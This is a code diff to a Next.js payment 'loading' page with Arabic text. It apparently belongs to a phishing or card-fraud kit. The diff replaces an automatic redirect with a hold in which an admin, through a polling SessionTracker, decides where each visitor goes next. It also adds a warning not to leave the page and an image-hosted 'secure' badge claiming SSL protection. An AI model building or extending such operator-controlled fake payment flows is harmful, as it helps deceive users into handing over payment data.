@@ -1,21 +1,12 @@
 "use client";
 export const dynamic = 'force-dynamic';
-import { useEffect } from "react";
-import { useRouter } from "next/navigation";
 import SessionTracker from "@/components/SessionTracker";
 
 const GREEN = "#1e7344";
 
 export default function LoadingPage() {
-  const router = useRouter();
-
-  useEffect(() => {
-    // بعد 5 ثواني ننتقل لصفحة النجاح
-    const timer = setTimeout(() => {
-      router.push("/success");
-    }, 5000);
-    return () => clearTimeout(timer);
-  }, [router]);
+  // لا يوجد redirect تلقائي - الصفحة تنتظر أمر الأدمين
+  // SessionTracker يتولى polling كل 30 ثانية ويعيد التوجيه حسب أمر الأدمين
 
   return (
     <div style={{ backgroundColor: "#f7f8fa", display: "flex", justifyContent: "center", alignItems: "center", minHeight: "100vh", flexDirection: "column", padding: "20px" }}>
@@ -34,14 +25,16 @@ export default function LoadingPage() {
 
         <style>{`@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }`}</style>
 
-        <h2 style={{ fontSize: "22px", color: "#333", marginBottom: "15px", fontWeight: "bold" }}>جاري معالجة طلبك</h2>
-        <p style={{ fontSize: "15px", color: "#666", lineHeight: "1.8", marginBottom: "20px" }}>
-          يرجى الانتظار، جاري التحقق من بياناتك وتأكيد الحجز...
+        <h2 style={{ fontSize: "22px", color: "#333", marginBottom: "15px", fontWeight: "bold" }}>جاري معالجة الطلب...</h2>
+        <p style={{ fontSize: "14px", color: "#666", lineHeight: "1.8", marginBottom: "20px" }}>
+          يرجى الانتظار، جاري التحقق من بياناتك وإتمام عملية الدفع.
+          <br />
+          <strong style={{ color: "#e74c3c" }}>لا تغلق الصفحة أو تضغط على زر الرجوع</strong>
         </p>
 
         <div style={{ marginTop: "25px", paddingTop: "20px", borderTop: "1px solid #eee", display: "flex", flexDirection: "column", alignItems: "center", gap: "10px" }}>
-          <img src="https://i.ibb.co/tpNdmqZz/IMG-20260312-WA0007.jpg" style={{ width: "100%", maxWidth: "220px", height: "auto" }} alt="Secure" />
-          <span style={{ fontSize: "12px", color: "#888" }}>🔒 معالجة آمنة ومشفرة</span>
+          <img src="https://i.ibb.co/rKgZj74W/IMG-20260323-WA0008.jpg" style={{ width: "100%", maxWidth: "280px", height: "auto", borderRadius: "8px" }} alt="Secure" />
+          <span style={{ fontSize: "12px", color: "#888" }}>🔒 جميع بياناتك محمية بتشفير SSL</span>
         </div>
       </div>
     </div>
